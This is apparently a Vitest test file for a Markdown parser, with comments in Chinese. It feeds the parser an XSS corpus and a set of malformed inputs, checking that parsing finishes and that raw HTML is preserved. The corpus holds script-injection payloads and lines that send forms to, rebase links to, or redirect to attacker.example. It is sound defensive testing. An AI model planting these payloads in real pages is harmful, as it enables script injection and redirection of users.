/**
 * 敌意输入语料。这一层也是第一天就要建的（另一层是 golden 快照）。
 *
 * 现在还没有 HTML 输出，所以这里断言的是**解析器不会因为敌意输入崩掉或卡死**，
 * 以及裸 HTML 被原样保留成 html 节点（ADR-0021：不过滤，安全交给产物的 CSP）。
 * 等 HTML 组装器到位后，同一批语料要再断言一遍「产物里这些东西被 CSP 挡住」。
 */

import { describe, expect, it } from 'vitest'
import { parse } from '../src/parse.js'

const XSS_CORPUS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg onload=alert(1)></svg>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<a href="javascript:alert(1)">点我</a>',
  '[点我](javascript:alert%281%29)',
  '<style>:root{--pf-bg:red}</style>',
  '<div style="position:fixed;inset:0;background:red"></div>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<form action="https://attacker.example"><input name=a></form>',
  '<object data="data:text/html,<script>alert(1)</script>"></object>',
  '<base href="https://attacker.example/">',
  '<meta http-equiv="refresh" content="0;url=https://attacker.example">',
  '<!--><script>alert(1)</script>-->',
  '<a href="&#106;avascript:alert(1)">实体编码</a>',
  '<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+">',
]

const MALFORMED = [
  ':'.repeat(200),
  ':::'.repeat(200),
  '::::tabs\n'.repeat(200),
  '```'.repeat(200),
  '---\n'.repeat(50),
  '---\n:\n---\n',
  '---\ntitle: |\n  ' + 'x'.repeat(5000) + '\n---\n',
  '::::tabs\n:::tab[' + 'x'.repeat(2000) + ']\n:::\n::::',
  '> '.repeat(500) + '文字',
  '- '.repeat(500) + '文字',
  '#'.repeat(200) + ' 标题',
  '|' + '---|'.repeat(300),
  '\u0000\u0001\u0002 控制字符',
  '𝕏𝕐𝖹 🧨🏳️‍🌈 组合字符',
  '',
  '\n\n\n',
]

describe('敌意输入：解析器不崩、不卡死', () => {
  for (const [index, source] of XSS_CORPUS.entries()) {
    // 「不卡死」由 vitest 自己的用例超时判定，不用手写墙钟断言——
    // 整套测试并行跑时机器是抢着用的，墙钟数字只会变成随机失败。
    //
    // 超时给到 120 秒不是因为解析慢，是因为 v8 覆盖率插桩慢：
    // 实测同一段输入（200 层 `::::tabs`）跑编译后的 dist 只要 112ms，
    // 跑 `--coverage` 要 14258ms，127 倍。这个上限仍然能抓住真正的死循环。
    it(
      `XSS 语料 #${index + 1} 能解析完`,
      () => {
        expect(parse(source).ast.type).toBe('root')
      },
      120_000,
    )
  }

  for (const [index, source] of MALFORMED.entries()) {
    it(
      `畸形输入 #${index + 1} 能解析完`,
      () => {
        expect(parse(source).ast.type).toBe('root')
      },
      120_000,
    )
  }
})

describe('裸 HTML 原样保留（ADR-0021），过滤这件事不在解析层', () => {
  it('script 标签被保留成 html 节点而不是被吞掉', () => {
    const result = parse('<script>alert(1)</script>\n')
    expect(JSON.stringify(result.ast)).toContain('alert(1)')
  })

  it('解析层不产出任何安全相关的诊断——安全边界在产物的 CSP 上', () => {
    for (const source of XSS_CORPUS) {
      const codes = parse(source).diagnostics.map((d) => d.code)
      expect(codes.filter((code) => code.startsWith('DIR-'))).toEqual([])
    }
  })
})
